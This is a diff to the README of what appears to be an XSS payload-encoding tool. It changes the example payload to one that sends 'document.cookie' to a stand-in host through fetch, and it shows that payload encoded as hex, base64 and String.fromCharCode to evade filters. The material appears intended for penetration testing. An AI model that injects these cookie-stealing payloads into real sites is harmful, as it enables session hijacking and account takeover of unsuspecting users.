@@ -30,34 +30,34 @@ optional arguments:
 #### Hexa encoding
 
 ```sh-session
-python3 enc-ow-der.py -i "document.location.replace('http://example.com/'+btoa(document.cookie))"
+python3 enc-ow-der.py -i "fetch('http://example.com/'+btoa(document.cookie))"
 ```
-```bash
-\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x68\x74\x74\x70\x3a\x2f\x2f\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x2f\x27\x2b\x62\x74\x6f\x61\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x29
+```
+\x66\x65\x74\x63\x68\x28\x27\x68\x74\x74\x70\x3a\x2f\x2f\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x2f\x27\x2b\x62\x74\x6f\x61\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x29
 ```
 
 #### Base64 encoding
 
 ```sh-session
-python3 enc-ow-der.py -i "document.location.replace('http://example.com/'+btoa(document.cookie))" -b64
+python3 enc-ow-der.py -i "fetch('http://example.com/'+btoa(document.cookie))" -b64
 ```
 ```
-ZG9jdW1lbnQubG9jYXRpb24ucmVwbGFjZSgnaHR0cDovL2V4YW1wbGUuY29tLycrYnRvYShkb2N1bWVudC5jb29raWUpKQ==
+ZmV0Y2goJ2h0dHA6Ly9leGFtcGxlLmNvbS8nK2J0b2EoZG9jdW1lbnQuY29va2llKSk=
 ```
 
-#### String.fromCharCode output
+#### `String.fromCharCode` output
 ```sh-session
-python3 enc-ow-der.py -i "document.location.replace('http://example.com/'+ btoa(document.cookie))" -fchar
+python3 enc-ow-der.py -i "fetch('http://example.com/'+ btoa(document.cookie))" -fchar
 ```
 ```
-String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,114,101,112,108,97,99,101,40,39,104,116,116,112,58,47,47,101,120,97,109,112,108,101,46,99,111,109,47,39,43,32,98,116,111,97,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,41)
+String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,101,120,97,109,112,108,101,46,99,111,109,47,39,43,32,98,116,111,97,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,41)
 ```
 
 #### Base64 encoding + `String.fromCharCode` output
 
 ```sh-session
-python3 enc-ow-der.py -i "document.location.replace('http://example.com/'+ btoa(document.cookie))" -fchar -b64
+python3 enc-ow-der.py -i "fetch('http://example.com/'+ btoa(document.cookie))" -fchar -b64
 ```
 ```
-String.fromCharCode(90,71,57,106,100,87,49,108,98,110,81,117,98,71,57,106,89,88,82,112,98,50,52,117,99,109,86,119,98,71,70,106,90,83,103,110,97,72,82,48,99,68,111,118,76,50,86,52,89,87,49,119,98,71,85,117,89,50,57,116,76,121,99,114,73,71,74,48,98,50,69,111,90,71,57,106,100,87,49,108,98,110,81,117,89,50,57,118,97,50,108,108,75,83,107,61)
+String.fromCharCode(90,109,86,48,89,50,103,111,74,50,104,48,100,72,65,54,76,121,57,108,101,71,70,116,99,71,120,108,76,109,78,118,98,83,56,110,75,121,66,105,100,71,57,104,75,71,82,118,89,51,86,116,90,87,53,48,76,109,78,118,98,50,116,112,90,83,107,112)
 ```
